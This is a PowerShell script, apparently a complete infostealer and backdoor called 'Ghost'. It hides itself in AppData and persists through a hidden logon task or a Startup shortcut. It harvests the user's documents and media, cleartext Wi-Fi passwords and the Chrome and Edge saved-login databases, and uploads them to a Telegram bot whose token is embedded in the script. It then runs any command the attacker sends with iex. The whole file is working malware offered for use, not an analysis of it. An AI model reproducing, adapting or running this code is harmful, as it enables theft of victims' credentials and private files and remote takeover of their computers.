param([switch]$poll)
$ErrorActionPreference='SilentlyContinue'
$tok='9213324981:AAG-back1py2J5fsGXfIATEJMa2M625xBD0'
$cid='9185389635'
$api="https://api.telegram.org/bot$tok"
$base='https://raw.githubusercontent.com/TWOJ_LOGIN/ghost/main'
$me="$env:APPDATA\Microsoft\Windows\GhostSys.ps1"

function T($m){ try{ Invoke-RestMethod "$api/sendMessage" -Method Post -Body @{chat_id=$cid;text=$m} | Out-Null }catch{} }
function TD($f){ if(Test-Path $f){ try{ curl.exe -s -F "chat_id=$cid" -F "document=@$f" "$api/sendDocument" | Out-Null }catch{} } }

if(-not $poll){
  New-Item -ItemType Directory (Split-Path $me) -Force | Out-Null
  try{ iwr -useb "$base/run.ps1?t=$([int](Get-Date -UFormat %s))" -OutFile $me -UseB }catch{ Copy-Item $PSCommandPath $me -Force }

  schtasks /create /tn "GhostSystem01" /tr "powershell -w hidden -nop -ep bypass -f `"$me`" -poll" /sc onlogon /f | Out-Null
  if(-not (schtasks /query /tn "GhostSystem01" 2>$null)){
    $lnk="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\GhostSystem01.lnk"
    $ws=New-Object -ComObject WScript.Shell
    $s=$ws.CreateShortcut($lnk)
    $s.TargetPath="powershell"
    $s.Arguments="-w hidden -nop -ep bypass -f `"$me`" -poll"
    $s.WindowStyle=7
    $s.Save()
  }

  $dst="$env:TEMP\g"; New-Item -ItemType Directory $dst -Force | Out-Null
  $dirs="$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos"
  Get-ChildItem $dirs -Recurse -File -EA 0 | Where-Object {
      $_.Length -lt 8MB -and ($_.Extension -match '^\.(mp4|mov|avi|mkv|jpg|jpeg|png|pdf|docx|xlsx|txt|zip)$' -or $_.Name -match 'wa[zż]ne')
  } | Copy-Item -Destination $dst -Force -EA 0

  netsh wlan show profiles key=clear > "$env:TEMP\wifi.txt" -EA 0
  foreach($p in "Google\Chrome\User Data\Default\Login Data","Microsoft\Edge\User Data\Default\Login Data"){
    Copy-Item "$env:LOCALAPPDATA\$p" "$env:TEMP\$(($p -split '\\')[0]).db" -Force -EA 0
  }
  Compress-Archive "$dst\*" "$env:TEMP\out.zip" -Force -EA 0

  T "GHOST ONLINE: $(whoami) @ $env:COMPUTERNAME"
  TD "$env:TEMP\out.zip"; TD "$env:TEMP\wifi.txt"
  TD "$env:TEMP\Chrome.db"; TD "$env:TEMP\Microsoft.db"
}

$off=0
try{ $u=Invoke-RestMethod "$api/getUpdates?offset=-1" -TimeoutSec 15; if($u.result){ $off=$u.result[-1].update_id+1 } }catch{}

while($true){
  try{
    $u=Invoke-RestMethod "$api/getUpdates?offset=$off&timeout=30" -TimeoutSec 45
    foreach($r in $u.result){
      $off=$r.update_id+1
      $c=$r.message.text
      if($c -and $c -notmatch '^/'){
        $o=(iex $c 2>&1 | Out-String)
        if($o.Length -gt 3500){ $o | Out-File "$env:TEMP\o.txt"; TD "$env:TEMP\o.txt" } else { T $o }
      }
    }
  }catch{}
  Start-Sleep 2
}